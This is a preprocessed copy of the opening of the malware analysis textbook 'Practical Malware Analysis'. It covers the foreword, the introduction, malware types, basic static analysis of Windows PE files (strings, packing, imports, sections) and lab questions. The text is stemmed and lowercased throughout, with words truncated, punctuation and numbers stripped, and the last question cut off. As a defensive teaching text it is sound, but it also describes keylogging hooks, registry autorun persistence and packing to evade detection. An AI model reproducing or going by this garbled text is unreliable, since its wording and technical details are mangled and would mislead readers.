practic malwar analysi handson guid dissect malici softwar michael sikorski andrew honig editor tyler ortman copyright practic malwar analysi copyright michael sikorski andrew honig right reserv part work may reproduc transmit form mean electron mechan includ photocopi record inform storag retriev system without prior written permiss copyright owner publish isbn publish william pollock product editor alison law cover illustr hugh dandrad interior design octopod studio development editor william pollock tyler ortman technic review stephen lawler copyeditor marilyn smith compositor riley hoffman proofread iren barnard index nanci guenther inform book distributor translat pleas contact starch press inc directli librari congress cataloginginpubl data catalog record book avail librari congress starch press starch press logo regist trademark starch press inc product compani name mention herein may trademark respect owner rather use trademark symbol everi occurr trademark name use name editori fashion benefit trademark owner intent infring trademark inform book distribut basi without warranti everi precaut hasbeen taken prepar work neither author starch press inc shall liabil person entiti respect loss damag caus alleg caus directli indirectli inform contain starch pressprais practic malwar analysi excel crash cours malwar analysi dino dai zovi ndepend ecur c onsult comprehens guid analysi malwar offer detail coverag essenti skill requir understand specif challeng present modern malwar chri eagl enior l ectur c omput cienc n aval p ostgradu chool handson introduct malwar analysi id recommend anyon want dissect window malwar ilfak guilfanov c reator ida p ro great introduct malwar analysi chapter contain detail technic explan hand lab exercis get immedi exposur real malwar sebastian porst g oogl oftwar e ngineer bring reverseengin reader skill level technic rich access lab lead deeper understand art scienc reverseengin strongli recommend book beginn expert alik danni quist p h f ounder ffensiv c omput read one malwar book look break world malwar analysi book get patrick engbretson ia p rofessor akota tate u nivers uthor basic hack pen test excel addit cours materi advanc graduat level cours softwar secur intrus detect system lab especi use student teach method revers engin analyz understand malici softwar sal stolfo p rofessor c olumbia u niversitywarn book malwar link softwar describ book malici exercis extrem caution execut unknown code visit untrust url hint creat safe virtual environ malwar analysi visit chapter dont stupid secur environmentabout author michael sikorski comput secur consult mandiant revers engin malici softwar support incid respons investig provid special research develop secur solut compani feder client base mike creat seri cours malwar analysi teach varieti audienc includ fbi black hat came mandiant mit lincoln laboratori perform research passiv network map penetr test mike also graduat nsa threeyear system network interdisciplinari program snip nsa contribut research reverseengin techniqu receiv multipl invent award field network analysi andrew honig inform assur expert depart defens teach cours softwar analysi reverseengin window system program nation cryptolog school certifi inform system secur profession andi publicli credit sever zeroday exploit vmware virtual product develop tool detect innov malici softwar includ malici softwar kernel expert analyz understand malici nonmalici softwar year experi analyst comput secur industri technic review stephen lawler founder presid small comput softwar secur consult firm stephen activ work inform secur seven year primarili reverseengin malwar analysi vulner research member mandiant malwar analysi team assist highprofil comput intrus affect sever fortun compani previous work mantech intern secur mission assur sma divis discov numer zeroday vulner softwar exploit techniqu part ongo softwar assur effort prior life noth comput secur lead develop sonar simul compon us navi smmtt programabout contribut author nick harbour malwar analyst mandiant season veteran reverseengin busi year career inform secur began comput forens examin research depart defens comput forens laboratori last six year nick mandiant focus primarili malwar analysi research field antireverseengin techniqu written sever packer code obfusc tool pescrambl present black hat defcon sever time topic antireverseengin antiforens techniqu primari develop teacher black hat advanc malwar analysi cours lindsey lack technic director mandiant twelv year experi inform secur special malwar reverseengin network defens secur oper help creat oper secur oper center led research effort network defens develop secur host solut previous held posit nation inform assur research laboratori execut offic presid eop cabl wireless us armi addit bachelor degre comput scienc stanford univers lindsey also receiv master degre comput scienc emphasi inform assur naval postgradu school jerrold jay smith princip consult mandiant special malwar reverseengin forens analysi role contribut mani incid respons assist rang client fortun compani prior join mandiant jay nsa he allow talk jay hold bachelor degre electr engin comput scienc uc berkeley master degre comput scienc john hopkin universityforeword area digit secur seem asymmetr involv malwar defens tool oper system summer attend peiter mudg zatko keynot black hat la vega nevada talk mudg introduc asymmetr natur modern softwar explain analyz malwar binari count averag line code loc sampl set might argu mudg sampl includ simpl pedestrian malwar might ask someth truli weapon someth like hold breathstuxnet accord larri l constantin stuxnet includ loc therefor time size loc averag malwar sampl stuxnet highli special target probabl account aboveaverag size leav malwar world moment text editor im use gedit gnome text editor includ geditc locand geditc one total sourc file along directori publish gnome git sourc code repositori gedit count file directori yield loc ratio legitim applic loc malwar compar fairli straightforward tool like text editor averag malwar sampl seem effici mudg loc number seem littl low differ definit malwar exist mani malici applic exist suit mani function infrastructur element captur sort malwar count could reason consid sourc element zeu trojan cpp obj h etc count loc compar program like zeu one mudg averag sampl see ratio mudg compar malwar loc count secur product meant intercept defeat malici softwar cite million estim loc found modern defens product make math easier imagin product least million line code bring ratio ofoffens loc defens loc level word everi loc offens firepow defend write loc defens bastion mudg also compar malwar loc oper system malwar sampl built subvert analyst estim window xp built million loc one know mani loc built window mudg cite million count modern oper system presum think latest version window let revis downward million simplifi math million ratio size target oper system size malici weapon capabl abus let stop summar perspect loc count exercis produc stuxnet averag malwar simpl text editor averag malwar malwar suit averag malwar defens tool averag malwar target oper system averag malwar defend point view ratio defens tool target oper system averag malwar sampl seem fairli bleak even swap malwar suit size averag size doesnt appear improv defend situat much look like defend vendor expend lot effort produc thousand loc see brutal nifti nimbl intrud sport far fewer loc what defend answer take page playbook use leader outgunnedredefin obstacl opportun forget size defens tool target oper systemsther whole lot rejoic fact malwar sampl small rel speak imagin tri understand defens tool work sourc code level million loc wait that daunt task although research assign pet project one incred exampl read sophail critic analysi sopho antiviru tavi ormandi alsopres black hat la vega sort mammoth analysi except rule instead worri million loc hundr ten thousand settl area one thousand lessth place signific portion world malwar found defend primari goal respect malwar determin manifest environ deal reason size sampl right skill chanc answer question therebi reduc risk enterpris malwar author readi provid sampl author book your read provid skill practic malwar analysi sort book think everi malwar analyst keep handi your beginn your go read introductori handson materi need enter fight your intermedi practition take next level your advanc engin youll find extra gem push even higher youll abl say read fine manual ask question mentor practic malwar analysi realli two book onefirst text show reader analyz modern malwar could bought book reason alon benefit greatli instruct howev author decid go extra mile essenti write second book addit tome could call appli malwar analysi consist exercis short answer detail investig present end chapter appendix c author also wrote malwar use exampl ensur rich yet safe environ learn therefor rather despair appar asymmetri face digit defend glad malwar question take form current arm book like practic malwar analysi youll edg need better detect respond intrus enterpris client author expert realm find advic extract front line theoriz isol research lab enjoy read book know everi piec malwar reverseengin scrutin rais oppon cost expos dark art sunlight knowledgerichard bejtlich taosecur chief secur offic mandiant founder taosecur manassa park virginia januari httpwwwinformitcomarticlesarticleaspxp httpgitgnomeorgbrowsegedittreegeditid httpdlpacketstormsecuritynetpapersvirussophailpdfacknowledg thank lindsey lack nick harbour jerrold jay smith contribut chapter area expertis thank technic review stephen lawler singlehandedli review lab chapter thank seth summersett william ballenthin stephen davi contribut code book special thank go everyon starch press effort alison bill travi tyler glad work everyon els starch press individu thank mike dedic book rebeccai couldnt done without support love person life andi id like thank molli clair elois best famili guy could haveintroduct phone ring network guy tell youv hack custom sensit inform stolen network begin investig check log identifi host involv scan host antiviru softwar find malici program catch lucki break detect trojan hors name trojsnapak delet file attempt clean thing use network captur creat intrus detect system id signatur make sure machin infect patch hole think attack use break ensur doesnt happen sever day later network guy back tell sensit data stolen network seem like attack idea clearli id signatur fail machin infect antiviru softwar isnt provid enough protect isol threat upper manag demand explan happen tell malwar trojsnapak dont answer import question your look kind lame determin exactli trojsnapak elimin threat write effect network signatur find machin infect malwar make sure youv delet entir malwar packag one part answer manag question malici program tell boss need hire expens outsid consult cant protect network that realli best way keep job secur ah fortun smart enough pick copi practic malwar analysi skill youll learn book teach answer hard question show protect network malwar malwar analysismalici softwar malwar play part comput intrus secur incid softwar someth caus harm user comput network consid malwar includ virus trojan hors worm rootkit scarewar spywar variou malwar incarn sort differ thing youll see throughout book malwar analyst core set tool techniqu dispos analyz malwar malwar analysi art dissect malwar understand work identifi defeat elimin dont need uber hacker perform malwar analysi million malici program wild encount everi day malwar analysi critic anyon respond comput secur incid shortag malwar analysi profession skill malwar analyst seriou demand said book find malwar focu analyz malwar found focu malwar found window oper systembi far common oper system use todaybut skill learn serv well analyz malwar oper system also focu execut sinc common difficult file youll encount time weve chosen avoid discuss malici script java program instead dive deep method use dissect advanc threat backdoor covert malwar rootkitsprerequisit regardless background experi malwar analysi youll find someth use book chapter chapter discuss basic malwar analysi techniqu even secur program experi abl use perform malwar triag chapter chapter cover intermedi materi arm major tool skill need analyz malici program chapter requir knowledg program advanc materi chapter chapter use even season malwar analyst cover strategi techniqu analyz even sophist malici program program util anti disassembl antidebug pack techniqu book teach use variou malwar analysi techniqu understand use particular techniqu import know techniqu use wrong techniqu wrong situat frustrat wast time dont cover everi tool tool chang time core skill import also use realist malwar sampl throughout book download httpwwwpracticalmalwareanalysiscom httpwwwnostarchcommalwarehtm expos type thing youll see analyz realworld malwarepract handson learn extens experi teach profession reverseengin malwar analysi class taught us student learn best get practic skill learn weve found qualiti lab import qualiti lectur without lab compon nearli imposs learn analyz malwar end lab exercis end chapter allow practic skill taught chapter lab challeng realist malwar design demonstr common type behavior youll encount realworld malwar lab design reinforc concept taught chapter without overwhelm unrel inform lab includ one malici file download httpwwwpracticalmalwareanalysiscom httpwwwnostarchcommalwarehtm question guid lab short answer question detail analysi malwar lab meant simul realist malwar analysi scenario gener filenam provid insight function malwar real malwar youll start inform youll need use skill youv learn gather clue figur malwar amount time requir lab depend experi tri complet lab follow along detail analysi see variou techniqu use practic chapter contain three lab first lab gener easiest reader abl complet second lab meant moder difficult reader requir assist solut third lab meant difficult adept reader abl complet without help solutionswhat book practic malwar analysi begin easi method use get inform rel unsophist malici program proce increasingli complic techniqu use tackl even sophist malici program here youll find chapter chapter establish overal process methodolog analyz malwar chapter teach way get inform execut without run chapter walk set virtual machin use safe environ run malwar chapter teach easytous effect techniqu analyz malici program run chapter crash cours x assembl introduct x assembl languag provid foundat use ida pro perform indepth analysi malwar chapter show use ida pro one import malwar analysi tool well use ida pro throughout remaind book chapter provid exampl c code assembl teach understand highlevel function assembl code chapter cover wide rang windowsspecif concept necessari understand malici window program chapter explain basic debug use debugg malwar analyst chapter show use ollydbg popular debugg malwar analyst chapter cover use windbg debugg analyz kernelmod malwar rootkit chapter describ common malwar function show torecogn function analyz malwar chapter discuss analyz particularli stealthi class malici program hide execut within anoth process chapter demonstr malwar may encod data order make harder identifi activ network traffic victim host chapter teach use malwar analysi creat network signatur outperform signatur made captur traffic alon chapter explain malwar author design malwar hard disassembl recogn defeat techniqu chapter describ trick malwar author use make code difficult debug overcom roadblock chapter demonstr techniqu use malwar make difficult analyz virtual machin bypass techniqu chapter teach malwar use pack hide true purpos provid stepbystep approach unpack pack program chapter explain shellcod present tip trick specif analyz malici shellcod chapter instruct c code look differ compil perform analysi malwar creat use c chapter discuss malwar author may use bit malwar need know differ x x appendix briefli describ window function commonli use malwar appendix b list use tool malwar analyst appendix c provid solut lab includ chapter throughout book goal throughout book arm skill analyz defeat malwar type youll see cover lot materi use lab reinforc materi time youv finish book learn skill need analyz malwar includ simpl techniqu quickli analyz ordinari malwar complex sophist one analyz even themost enigmat malwar let get startedchapt malwar analysi primer get specif analyz malwar need defin terminolog cover common type malwar introduc fundament approach malwar analysi softwar someth caus detriment user comput networksuch virus trojan hors worm rootkit scarewar spywarecan consid malwar malwar appear mani differ form common techniqu use analyz malwar choic techniqu employ depend goal goal malwar analysi purpos malwar analysi usual provid inform need respond network intrus goal typic determin exactli happen ensur youv locat infect machin file analyz suspect malwar goal typic determin exactli particular suspect binari detect network measur contain damag identifi file requir full analysi time develop signatur detect malwar infect network youll learn throughout book malwar analysi use develop hostbas network signatur hostbas signatur indic use detect malici code victim comput indic often identifi file creat modifi malwar specif chang make registri unlik antiviru signatur malwar indic focu malwar system characterist malwar make effect detect malwar chang form delet hard disk network signatur use detect malici code monitor network traffic network signatur creat without malwar analysi signatur creat help malwar analysi usual far effect offer ahigh detect rate fewer fals posit obtain signatur final object figur exactli malwar work often ask question senior manag want full explan major intrus indepth techniqu youll learn book allow determin purpos capabl malici programsmalwar analysi techniqu often perform malwar analysi youll malwar execut wont humanread order make sens youll use varieti tool trick reveal small amount inform youll need use varieti tool order see full pictur two fundament approach malwar analysi static dynam static analysi involv examin malwar without run dynam analysi involv run malwar techniqu categor basic advanc basic static analysi basic static analysi consist examin execut file without view actual instruct basic static analysi confirm whether file malici provid inform function sometim provid inform allow produc simpl network signatur basic static analysi straightforward quick larg ineffect sophist malwar miss import behavior basic dynam analysi basic dynam analysi techniqu involv run malwar observ behavior system order remov infect produc effect signatur howev run malwar safe must set environ allow studi run malwar without risk damag system network like basic static analysi techniqu basic dynam analysi techniqu use peopl without deep program knowledg wont effect malwar miss import function advanc static analysi advanc static analysi consist reverseengin malwar intern load execut disassembl look program instruct order discov program instruct execut thecpu advanc static analysi tell exactli program howev advanc static analysi steeper learn curv basic static analysi requir special knowledg disassembl code construct window oper system concept youll learn book advanc dynam analysi advanc dynam analysi use debugg examin intern state run malici execut advanc dynam analysi techniqu provid anoth way extract detail inform execut techniqu use your tri obtain inform difficult gather techniqu book well show use advanc dynam analysi togeth advanc static analysi order complet analyz suspect malwaretyp malwar perform malwar analysi find often speed analysi make educ guess malwar tri confirm hypothes cours youll abl make better guess know kind thing malwar usual end categori malwar fall backdoor malici code instal onto comput allow attack access backdoor usual let attack connect comput littl authent execut command local system botnet similar backdoor allow attack access system comput infect botnet receiv instruct singl commandandcontrol server download malici code exist download malici code download commonli instal attack first gain access system download program download instal addit malici code informationst malwar malwar collect inform victim comput usual send attack exampl includ sniffer password hash grabber keylogg malwar typic use gain access onlin account email onlin bank launcher malici program use launch malici program usual launcher use nontradit techniqu launch malici program order ensur stealth greater access system rootkit malici code design conceal exist code rootkit usual pair malwar backdoor allow remot access attack make code difficult victim detect scarewar malwar design frighten infect user buy someth usual user interfac make look like antiviru secur program inform user malici code system way get rid buy softwar inreal softwar sell noth remov scarewar spamsend malwar malwar infect user machin use machin send spam malwar gener incom attack allow sell spamsend servic worm viru malici code copi infect addit comput malwar often span multipl categori exampl program might keylogg collect password worm compon send spam dont get caught classifi malwar accord function malwar also classifi base whether attack object mass target mass malwar scarewar take shotgun approach design affect mani machin possibl two object common usual less sophist easier detect defend secur softwar target target malwar like oneofakind backdoor tailor specif organ target malwar bigger threat network mass malwar widespread secur product probabl wont protect without detail analysi target malwar nearli imposs protect network malwar remov infect target malwar usual sophist analysi often requir advanc analysi skill cover bookgener rule malwar analysi well finish primer sever rule keep mind perform analysi first dont get caught detail malwar program larg complex cant possibl understand everi detail focu instead key featur run difficult complex section tri get gener overview get stuck weed second rememb differ tool approach avail differ job one approach everi situat differ variou tool techniqu youll learn similar sometim overlap function your luck one tool tri anoth get stuck dont spend long one issu move someth els tri analyz malwar differ angl tri differ approach final rememb malwar analysi like catandmous game new malwar analysi techniqu develop malwar author respond new techniqu thwart analysi succeed malwar analyst must abl recogn understand defeat techniqu respond chang art malwar analysispart basic analysischapt basic static techniqu begin explor malwar analysi static analysi usual first step studi malwar static analysi describ process analyz code structur program determin function program run time contrast perform dynam analysi analyst actual run program youll learn chapter chapter discuss multipl way extract use inform execut chapter well discuss follow techniqu use antiviru tool confirm malici use hash identifi malwar glean inform file string function header techniqu provid differ inform one use depend goal typic youll use sever techniqu gather much inform possibl antiviru scan use first step first analyz prospect malwar good first step run multipl antiviru program may alreadi identifi antiviru tool certainli perfect reli mainli databas identifi piec known suspici code file signatur well behavior pattern match analysi heurist identifi suspect file one problem malwar writer easili modifi code therebi chang program signatur evad viru scanner also rare malwar often goe undetect antiviru softwar simpli databas final heurist often success identifi unknown malici code bypass new uniqu malwar variou antiviru program use differ signatur heurist use run sever differ antiviru program piec ofsuspect malwar websit virustot httpwwwvirustotalcom allow upload file scan multipl antiviru engin virustot gener report provid total number engin mark file malici malwar name avail addit inform malwarehash fingerprint malwar hash common method use uniqu identifi malwar malici softwar run hash program produc uniqu hash identifi malwar sort fingerprint messagedigest algorithm md hash function one commonli use malwar analysi though secur hash algorithm sha also popular exampl use freeli avail mddeep program calcul hash solitair program come window would gener follow output c mddeep cwindowssystemsolex eaaacedbeec cwindowssystemsolex hash eaaacedbeec guibas winmd calcul shown figur calcul display hash sever file time uniqu hash piec malwar use follow use hash label share hash analyst help identifi malwar search hash onlin see file alreadi identifi figur output winmdfind string string program sequenc charact program contain string print messag connect url copi file specif locat search string simpl way get hint function program exampl program access url see url access store string program use string program httpbitlyicpl search execut string typic store either ascii unicod format note microsoft use term wide charact string describ implement unicod string vari slightli unicod standard throughout book refer unicod refer microsoft implement ascii unicod format store charact sequenc end null termin indic string complet ascii string use byte per charact unicod use byte per charact figur show string bad store ascii ascii string store byte x x x x x ascii represent capit letter b x repres letter x end null termin figur ascii represent string bad figur show string bad store unicod unicod string store byte x x x capit b repres byte x x null termin two x byte rowfigur unicod represent string bad string search execut ascii unicod string ignor context format analyz file type detect string across entir file though also mean may identifi byte charact string string search threelett greater sequenc ascii unicod charact follow string termin charact sometim string detect string program actual string exampl string find sequenc byte x x x x interpret string vp byte may actual repres string could memori address cpu instruct data use program string leav user filter invalid string fortun invalid string obviou repres legitim text exampl follow excerpt show result run string file bpex c string bpex vp vw e getlayout gdidll setlayout mc mail system dll invalidsend mail fail send messag exampl bold string ignor typic string short doesnt correspond word probabl meaningless hand string getlayout setlayout window function use window graphic librari easili identifi meaning string window function name normal begin capit letter subsequ word also begin capit lettergdidl meaning name common window dynam link librari dll use graphic program dll file contain execut code share among multipl applic might imagin number ip addressmost like one malwar use fashion final mail system dll invalidsend mail fail send messag error messag often use inform obtain run string found error messag particular messag reveal two thing subject malwar send messag probabl email depend mail system dll inform suggest might want check email log suspici traffic anoth dll mail system dll might associ particular malwar note miss dll necessarili malici malwar often use legitim librari dll goalspack obfusc malwar malwar writer often use pack obfusc make file difficult detect analyz obfusc program one whose execut malwar author attempt hide pack program subset obfusc program malici program compress analyz techniqu sever limit attempt static analyz malwar legitim program almost alway includ mani string malwar pack obfusc contain string upon search program string find string probabl either obfusc pack suggest may malici youll like need throw static analysi order investig note pack obfusc code often includ least function loadlibrari getprocaddress use load gain access addit function pack file pack program run small wrapper program also run decompress pack file run unpack file shown figur pack program analyz static small wrapper program dissect chapter discuss pack unpack detail figur file left origin execut string import informationvis right pack execut pack file string import inform compress invis static analysi tool detect packer peid one way detect pack file peid program use peid detect type packer compil employ build applic make analyz pack file much easier figur show inform origafex file report peid figur peid program note develop support peid discontinu sinc april still best tool avail packer compil detect mani case also identifi packer use pack file see peid identifi file pack upx version ignor inform shown well examin program detail chapter program pack must unpack order abl perform analysi unpack process often complex cover detail chapter upx pack program popular easi use unpack deserv special mention exampl unpack malwarepack upx would simpli download upx httpupxsourceforgenet run like use pack program input upx packedprogramex note mani peid plugin run malwar execut without warn see chapter learn set safe environ run malwar also like program especi use malwar analysi peid subject vulner exampl peid version contain buffer overflow allow attack execut arbitrari code would allow clever malwar writer write program exploit malwar analyst machin sure use latest version peidport execut file format far discuss tool scan execut without regard format howev format file reveal lot program function portabl execut pe file format use window execut object code dll pe file format data structur contain inform necessari window os loader manag wrap execut code nearli everi file execut code load window pe file format though legaci file format appear rare occas malwar pe file begin header includ inform code type applic requir librari function space requir inform pe header great valu malwar analystlink librari function one use piec inform gather execut list function import import function use one program actual store differ program code librari contain function common mani program code librari connect main execut link programm link import program dont need implement certain function multipl program code librari link static runtim dynam know librari code link critic understand malwar inform find pe file header depend librari code link well discuss sever tool view execut import function section static runtim dynam link static link least commonli use method link librari although common unix linux program librari static link execut code librari copi execut make execut grow size analyz code difficult differenti static link code execut code noth pe file header indic file contain link code unpopular friendli program runtim link commonli use malwar especi pack obfusc execut use runtim link connect librari function need program start dynam link program sever microsoft window function allow programm import link function list program file header two commonli use loadlibrari getprocaddress ldrgetprocaddress ldrloaddll also use loadlibrari getprocaddress allow program access function librari system mean function use cant tell static function link suspect programof link method dynam link common interest malwar analyst librari dynam link host os search necessari librari program load program call link librari function function execut within librari pe file header store inform everi librari load everi function use program librari use function call often import part program identifi particularli import allow us guess program exampl program import function urldownloadtofil might guess connect internet download content store local file explor dynam link function depend walker depend walker program httpwwwdependencywalkercom distribut version microsoft visual studio microsoft develop packag list dynam link function execut figur show depend walker analysi servicesex far left pane show program well dll import name kerneldl wsdll figur depend walker program click kerneldl show import function upperright pane see sever function interest createprocessa tell us program probabl creat anoth process suggest run program watch launch addit program middl right pane list function kerneldl importedinform particularli use us notic column pane label ordin execut import function ordin instead name import function ordin name function never appear origin execut harder analyst figur function use malwar import function ordin find function import look ordin valu pane bottom two pane list addit inform version dll would load ran program report error respect program dll tell lot function exampl tabl list common dll tell applic tabl common dll dll descript kerneldl common dll contain core function access manipul memori file hardwar advapidl dll provid access advanc core window compon servic manag registri userdl dll contain userinterfac compon button scroll bar compon control respond user action gdidll dll contain function display manipul graphic ntdlldll dll interfac window kernel execut gener import file directli although alway import indirectli kerneldl execut import file mean author intend use function normal avail window program task hide function manipul process use interfac wsockdll wsdll network dll program access either like connect network perform networkrel task wininetdl dll contain higherlevel network function implement protocol ftp http ntp function name convent evalu unfamiliar window function name convent worth note come often might confus dont recogn exampl often encount function name ex suffix createwindowex microsoft updat function new function incompat old one microsoft continu support old function new function given name old function ad ex suffix function significantli updat twice two ex suffix name mani function take string paramet includ w end name createdirectoryw letter appear document function simpli indic function accept string paramet two differ version function one ascii string one wide charact string rememb drop trail w search function microsoft document import functionsth pe file header also includ inform specif function use execut name window function give good idea execut microsoft excel job document window api microsoft develop network msdn librari youll also find list function commonli use malwar appendix export function like import dll exe export function interact program code typic dll implement one function export use execut import use pe file contain inform function file export dll specif implement provid function use exe export function common dll exe design provid function exe export function rare discov export execut often provid use inform mani case softwar author name export function way provid use inform one common convent use name use microsoft document exampl order run program servic must first defin servicemain function presenc export function call servicemain tell malwar run part servic unfortun microsoft document call function servicemain common programm function name therefor name export function actual limit use sophist malwar malwar use export often either omit name entir use unclear mislead name view export inform use depend walker program discuss explor dynam link function depend walker list export function click name file want examin refer back figur window show file export functionsstat analysi practic understand basic static analysi let examin real malwar well look potenti keylogg pack program potentialkeyloggerex unpack execut tabl show abridg list function import potentialkeyloggerex collect use depend walker see mani import immedi conclud file pack tabl abridg list dll function import potentialkeyloggerex kerneldl userdl userdl continu createdirectoryw begindeferwindowpo showwindow createfilew callnexthookex tounicodeex createthread createdialogparamw trackpopupmenu deletefilew createwindowexw trackpopupmenuex exitprocess defwindowprocw translatemessag findclos dialogboxparamw unhookwindowshookex findfirstfilew enddialog unregisterclassw findnextfilew getmessagew unregisterhotkey getcommandlinew getsystemmetr getcurrentprocess getwindowlongw gdidll getcurrentthread getwindowrect getstockobject getfiles getwindowtextw setbkmod getmodulehandlew invalidaterect settextcolor getprocessheap isdlgbuttoncheck getshortpathnamew iswindowen shelldll heapalloc loadcursorw commandlinetoargvwheapfre loadiconw shchangenotifi isdebuggerpres loadmenuw shgetfolderpathw mapviewoffil mapvirtualkeyw shellexecuteexw openprocess mapwindowpoint shellexecutew readfil messageboxw setfilepoint registerclassexw advapidl writefil registerhotkey regclosekey sendmessagea regdeletevaluew setclipboarddata regopencurrentus setdlgitemtextw regopenkeyexw setwindowtextw regqueryvalueexw setwindowshookexw regsetvalueexw like averages program execut contain larg number import function unfortun small minor function particularli interest malwar analysi throughout book cover import malici softwar focus interest function malwar analysi standpoint sure function need look help guid analysi appendix list mani function greatest interest malwar analyst function list appendix search msdn onlin new analyst spend time look mani function arent interest youll quickli start learn function could import one purpos exampl show larg number import uninterest becom familiar look lot data focus key nugget inform normal wouldnt know malwar potenti keylogg would need look function provid clue focus function provid hint function program import kerneldl tabl tell us softwar open andmanipul process openprocess getcurrentprocess getprocessheap file readfil createfil writefil function findfirstfil findnextfil particularli interest one use search directori import userdl even interest larg number gui manipul function registerclassex setwindowtext showwindow indic high likelihood program gui though gui necessarili display user function setwindowshookex commonli use spywar popular way keylogg receiv keyboard input function legitim use suspect malwar see function probabl look keylog function function registerhotkey also interest regist hotkey ctrlshift p whenev user press hotkey combin applic notifi matter applic current activ hotkey bring user applic import gdidll graphicsrel simpli confirm program probabl gui import shelldll tell us program launch programsa featur common malwar legitim program import advapidl tell us program use registri turn tell us search string look like registri key registri string look lot like directori case found string softwaremicrosoftwindowscurrentversionrun registri key commonli use malwar control program automat run window start execut also sever export lowlevelkeyboardproc low levelmouseproc microsoft document say lowlevelkeyboardproc hook procedur applicationdefin librari defin callback function use setwindowshookex function word function use setwindowshookex specifi function call specifi event occursin case lowlevel keyboardev document setwindowshookex explain function call certain lowlevel keyboard event occur microsoft document use name lowlevelkeyboardproc programm case well abl get valuabl inform programm didnt obscur name export use inform glean static analysi import export draw signific conclus formul hypothes malwar one seem like local keylogg use setwindowshookex record keystrok also surmis gui display specif user hotkey regist registerhotkey specifi hotkey malici user enter see keylogg gui access record keystrok specul registri function exist softwaremicrosoftwindowscurrentversionrun program set load system startup packedprogramex dead end tabl show complet list function import second piec unknown malwar breviti list tell us program pack obfusc confirm fact program readabl string window compil would creat program import small number function even hello world program would tabl dll function import packedprogramex kerneldl userdl getmodulehandlea messageboxa loadlibrarya getprocaddress exitprocess virtualalloc virtualfre fact program pack valuabl piec inform pack natur also prevent us learn anyth program use basic static analysi well need tri advanc analysi techniqu dynam analysi cover chapter unpack cover chapter pe file header section pe file header provid consider inform import pe file format contain header follow seri section header contain metadata file follow header actual section file contain use inform progress book continu discuss strategi view inform section follow common interest section pe file text text section contain instruct cpu execut section store data support inform gener section execut section includ code rdata rdata section typic contain import export inform inform avail depend walker peview section also store readonli data use program sometim file contain idata edata section store import export inform see tabl data data section contain program global data access anywher program local data store section anywher els pe file address topic chapter rsrc rsrc section includ resourc use execut consid part execut icon imag menu string string store either rsrc section main program often store rsrc section multilanguag support section name often consist across compil vari across differ compil exampl visual studio use text execut code borland delphi use code window doesnt care actual name sinc use inform pe header determin section use furthermor section name sometim obfusc make analysi difficult luckili default name use time tabl list common youll encountert section pe file window execut execut descript text contain execut code rdata hold readonli data global access within program data store global data access throughout program idata sometim present store import function inform section present import function inform store rdata section edata sometim present store export function inform section present export function inform store rdata section pdata present bit execut store exceptionhandl inform rsrc store resourc need execut reloc contain inform reloc librari file examin pe file peview pe file format store interest inform within header use peview tool brows inform shown figur figur left pane display main part pe header imagefilehead entri highlight current select first two part pe headerth imagedoshead msdo stub programar histor offer inform particular interest us next section pe header imagenthead show nt header signatur alway ignor imagefilehead entri highlight display right panel contain basic inform file time date stamp descript tell us execut compil use malwar analysi incid respons exampl old compil time suggest older attack antiviru program might contain signatur malwar new compil time suggest reversefigur view imagefilehead peview program said compil time bit problemat delphi program use compil time june see compil time your probabl look delphi program wont realli know compil addit compet malwar writer easili fake compil time see compil time make sens probabl fake imageoptionalhead section includ sever import piec inform subsystem descript indic whether consol gui program consol program valu imagesubsystemwindowscui run insid command window gui program valu imagesubsystemwindowsgui run within window system less common subsystem nativ xbox also use interest inform come section header imagesectionhead shown figur header use describ section pe file compil gener creat name section execut user littl control name result section usual consist execut execut see tabl deviat may suspici exampl figur virtual size tell us much space alloc section load process size raw data show big section disk two valu usual equal datashould take much space disk memori small differ normal due differ align memori disk section size use detect pack execut exampl virtual size much larger size raw data know section take space memori disk often indic pack code particularli text section larger memori disk figur view imagesectionhead text section peview program tabl show section potentialkeyloggerex see text rdata rsrc section virtual size size raw data valu size data section may seem suspici much larger virtual size raw data size normal data section window program note inform alon tell us program malici simpli show like pack pe file header gener compil tabl section inform potentialkeyloggerex section virtual size size raw data text af c data rdata af c rsrc b tabl show section packedprogramex section file number anomali section name dijfpd sdfuok kijijl unusu text data rdata section suspici text section size raw data valu mean take space disk virtual size valu mean space alloc text segment tell us packer unpack execut code alloc text section tabl section inform packedprogramex name virtual size size raw data text data rdata rsrc dijfpd sdfuok f kijijl view resourc section resourc hacker finish look header pe file look section section examin without addit knowledg later chapter resourc section use free resourc hacker tool found httpwwwangusjcom brows rsrc section click item resourc hacker youll see string icon menu menu display ident program use figur show resourc hacker display window calcul program calcex figur resourc hacker tool display calcex panel left show resourc includ execut root folder shown left pane store differ type resourc inform section malwar analysi includ icon section list imag shown execut file list menu section store menu appear variou window file edit view menu section contain name menu well text shown name give good idea function dialog section contain program dialog menu dialog showswhat user see run calcex knew noth els calcex could identifi calcul program simpli look dialog menu string tabl section store string version info section contain version number often compani name copyright statement rsrc section shown figur typic window applic includ whatev programm requir note malwar occasion legitim softwar often store embed program driver program run extract embed execut driver resourc hacker let extract file individu analysi use pe file tool mani tool avail brows pe header two use tool pebrows profession pe explor pebrows profession httpwwwsmidgeonsoftprohostingcompebrows profileviewerhtml similar peview allow look byte section show pars data pebrows profession better job present inform resourc rsrc section pe explor httpwwwheaventoolscom rich gui allow navig variou part pe file edit certain part pe file includ resourc editor great brows edit file resourc tool main drawback free pe header summari pe header contain use inform malwar analyst continu examin subsequ chapter tabl review key inform obtain pe header tabl inform pe headerfield inform reveal import function librari use malwar export function malwar meant call program librari time date stamp time program compil section name section file size disk memori subsystem indic whether program commandlin gui applic resourc string icon menu inform includ fileconclus use suit rel simpl tool perform static analysi malwar gain certain amount insight function static analysi typic first step analysi usual necessari next step set safe environ run malwar perform basic dynam analysi youll see next two chapterslab purpos lab give opportun practic skill taught chapter order simul realist malwar analysi given littl inform program analyz like lab throughout book basic static analysi lab file given gener name simul unknown malwar typic use meaningless mislead name lab consist malici file question short answer question detail analysi malwar solut lab includ appendix c lab includ two section answer first section consist short answer use lab want check work second section includ detail explan follow along solut learn found answer question pose lab lab lab use file labex labdll use tool techniqu describ chapter gain inform file answer question question q upload file httpwwwvirustotalcom view report either file match exist antiviru signatur q file compil q indic either file pack obfusc indic q import hint malwar import q file hostbas indic could look infect system q networkbas indic could use find malwar infect machinesq would guess purpos file lab analyz file labex question q upload labex file httpwwwvirustotalcom match exist antiviru definit q indic file pack obfusc indic file pack unpack possibl q import hint program function import tell q hostor networkbas indic could use identifi malwar infect machin lab analyz file labex question q upload labex file httpwwwvirustotalcom match exist antiviru definit q indic file pack obfusc indic file pack unpack possibl q import hint program function import tell q hostor networkbas indic could use identifi malwar infect machin lab analyz file labex question q upload labex file 